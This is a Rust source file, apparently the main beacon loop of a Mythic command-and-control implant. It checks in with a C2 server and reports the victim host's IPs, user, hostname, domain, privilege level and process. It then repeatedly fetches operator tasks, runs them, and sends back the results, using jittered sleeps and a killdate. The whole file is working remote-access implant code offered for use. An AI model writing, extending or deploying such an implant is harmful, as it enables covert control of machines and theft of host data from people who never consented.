use core::sync::atomic::Ordering;
use std::panic::catch_unwind;
use std::thread::sleep;
use std::time::Duration;

use mythic::{
    AgentMessageExtras, C2Transport, MythicAgent, MythicError, MythicResult, RespGetTasking,
    TaskResponse,
};
use rand::seq::SliceRandom;
use uuid::Uuid;

use crate::config::Config;
use crate::dispatch;
use crate::sys::metadata;
use crate::{
    DEBUG, EXIT_PROCESS, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep, take_extra,
};

// ── Helpers ─────────────────────────────────────────────

/// Dispatch a task, catching panics so one bad handler can't crash the agent.
fn safe_dispatch(task: &mythic::TaskMessage) -> TaskResponse {
    let t = task.clone();
    catch_unwind(move || dispatch::dispatch(&t))
        .unwrap_or_else(|_| TaskResponse::failed(task.id, "task handler panicked"))
}

/// Run a handler and return its primary response plus any extra responses
/// pushed via `crate::push_extra` (e.g. multi-chunk download chunks).
fn safe_dispatch_with_extras(task: &mythic::TaskMessage) -> Vec<TaskResponse> {
    let primary = safe_dispatch(task);
    let extras = take_extra();
    let mut out = Vec::with_capacity(1 + extras.len());
    out.push(primary);
    out.extend(extras);
    out
}

fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
    for c2 in c2s {
        // If the C2 profile type carries an external_ip_check flag, honour it.
        // For the upstream C2Transport trait we don't have such a method, so
        // we look it up via any concrete wrapper (HttpProfile / C2Profile) that
        // the agent loop was given. When unavailable, the external IP is
        // always queried — this matches the previous (pre-fix) behaviour.
        let external_ip = metadata::external_ip();
        if let Ok(agent) = MythicAgent::easy_checkin(
            payload_uuid,
            c2,
            metadata::local_ips(),
            metadata::os(),
            metadata::user(),
            metadata::hostname(),
            metadata::pid(),
            metadata::arch(),
            metadata::domain(),
            metadata::integrity_level(),
            external_ip,
            None,
            None,
            metadata::process_name(),
        ) {
            return Ok(agent);
        }
    }
    Err(MythicError::InvalidPacket)
}

fn get_tasking_with<C: C2Transport>(
    mythic: &MythicAgent,
    task_size: u32,
    c2: &C,
    responses: Vec<TaskResponse>,
) -> MythicResult<RespGetTasking> {
    let extras = AgentMessageExtras {
        responses,
        ..Default::default()
    };
    mythic.get_tasking_with(task_size, c2, extras)
}

fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<TaskResponse>) {
    if pending.is_empty() {
        return;
    }
    let total = pending.len();
    info!("[*] flushing {} response(s) before exit", total);
    // Retry up to 3 times, but each attempt needs a fresh Vec clone because
    // get_tasking_with moves it.
    for attempt in 1..=3u32 {
        let attempt_vec = pending.clone();
        match get_tasking_with(mythic, 5, c2, attempt_vec) {
            Ok(_) => return,
            Err(e) => {
                if DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[!] flush attempt {attempt}/3 failed: {e}");
                }
                if attempt < 3 {
                    sleep(Duration::from_secs(1));
                }
            }
        }
    }
    if DEBUG.load(Ordering::Relaxed) {
        eprintln!("[!] flush dropped {total} response(s) after 3 attempts");
    }
}

/// If EXIT_PROCESS is set, terminate the process after flushing responses.
fn maybe_exit_process() {
    if EXIT_PROCESS.load(Ordering::Acquire) {
        info!("[*] exiting process");
        std::process::exit(0);
    }
}

fn sleep_with_jitter() {
    let interval = INTERVAL.load(Ordering::Acquire);
    if interval == 0 {
        return;
    }
    // JITTER is a percentage (0–100): extra sleep = interval * jitter% * random
    let jitter_pct = JITTER.load(Ordering::Acquire).min(100);
    let jitter_secs = if jitter_pct > 0 {
        (interval * jitter_pct / 100) as f64 * rand::random::<f64>()
    } else {
        0.0
    };
    let total_sleep = interval as f64 + jitter_secs;

    // Sleep in 60-second chunks so killdate is checked reasonably often
    let mut remaining = (total_sleep as u64).max(1);
    while remaining > 0 && !past_killdate() {
        let chunk = remaining.min(60);
        sleep(Duration::from_secs(chunk));
        remaining -= chunk;
    }
}

fn past_killdate() -> bool {
    let kd = KILLDATE.load(Ordering::Acquire);
    if kd == 0 {
        return false;
    }
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    now >= kd
}

fn parse_killdate_ts(s: &str) -> u64 {
    match chrono::NaiveDate::parse_from_str(s, "%Y-%m-%d") {
        Ok(d) => d
            .and_hms_opt(0, 0, 0)
            .map(|dt| dt.and_utc().timestamp() as u64)
            .unwrap_or(0),
        Err(_) => 0,
    }
}

// ── Main loop ───────────────────────────────────────────

pub fn run(config: Config) -> MythicResult<()> {
    let payload_uuid = config.payload_uuid;
    info!("[*] Agent start, payload_uuid={}", payload_uuid);

    let profiles = config.c2_profiles;
    if profiles.is_empty() {
        if DEBUG.load(Ordering::Relaxed) {
            eprintln!("[!] no C2 profiles configured, exiting");
        }
        return Ok(());
    }

    // Wire per-profile flags (currently: external_ip_check) into the metadata
    // module so the easy_checkin call below honours the operator's intent.
    metadata::set_external_ip_check(profiles.iter().any(|p| p.external_ip_check()));

    let mythic = get_agent(payload_uuid, &profiles)?;

    set_sleep(
        profiles[0].callback_interval(),
        Some(profiles[0].callback_jitter()),
    );

    if let Some(ref kd) = profiles[0].killdate() {
        let ts = parse_killdate_ts(kd);
        if ts > 0 {
            set_killdate(ts);
            if past_killdate() {
                info!("[*] past killdate ({kd}), exiting");
                return Ok(());
            }
        }
    }

    let mut rng = rand::thread_rng();
    let mut pending: Vec<TaskResponse> = Vec::new();

    // First round: jitter then pure get_tasking
    sleep_with_jitter();
    let c2 = profiles.choose(&mut rng).unwrap();
    let tasking = get_tasking_with(&mythic, 5, c2, Vec::new())?;
    if DEBUG.load(Ordering::Relaxed) {
        info!("task: {:?}", tasking);
    }
    for t in &tasking.tasks {
        pending.extend(safe_dispatch_with_extras(t));
    }
    if SHOULD_EXIT.load(Ordering::Acquire) {
        let c2 = profiles.choose(&mut rng).unwrap();
        flush_pending(&mythic, c2, pending);
        maybe_exit_process();
        info!("[*] agent exited (thread)");
        return Ok(());
    }

    loop {
        // Check killdate each cycle
        if past_killdate() {
            println!("[*] past killdate, exiting");
            let c2 = profiles.choose(&mut rng).unwrap();
            flush_pending(&mythic, c2, pending);
            maybe_exit_process();
            return Ok(());
        }

        sleep_with_jitter();
        let c2 = profiles.choose(&mut rng).unwrap();

        // Move pending into the request. The Err branch needs the
        // responses back, so clone first; the Ok branch can keep them
        // and avoid the second allocation by moving into the call.
        let batch = std::mem::take(&mut pending);
        let cloned_for_retry = batch.clone();
        match get_tasking_with(&mythic, 5, c2, batch) {
            Ok(tasking) => {
                if DEBUG.load(Ordering::Relaxed) {
                    info!("task: {:?}", tasking);
                }
                for t in &tasking.tasks {
                    pending.extend(safe_dispatch_with_extras(t));
                }
                if SHOULD_EXIT.load(Ordering::Acquire) {
                    let c2 = profiles.choose(&mut rng).unwrap();
                    flush_pending(&mythic, c2, pending);
                    maybe_exit_process();
                    info!("[*] agent exited (thread)");
                    return Ok(());
                }
            }
            Err(e) => {
                if DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[!] get_tasking failed: {e}");
                }
                // Re-queue everything we tried to send so the next round
                // re-attempts. Note: this can grow pending on a sustained
                // outage — operators should expect the agent to back off
                // gracefully via the 5s sleep below.
                pending.extend(cloned_for_retry);
                sleep(Duration::from_secs(5));
            }
        }
    }
}
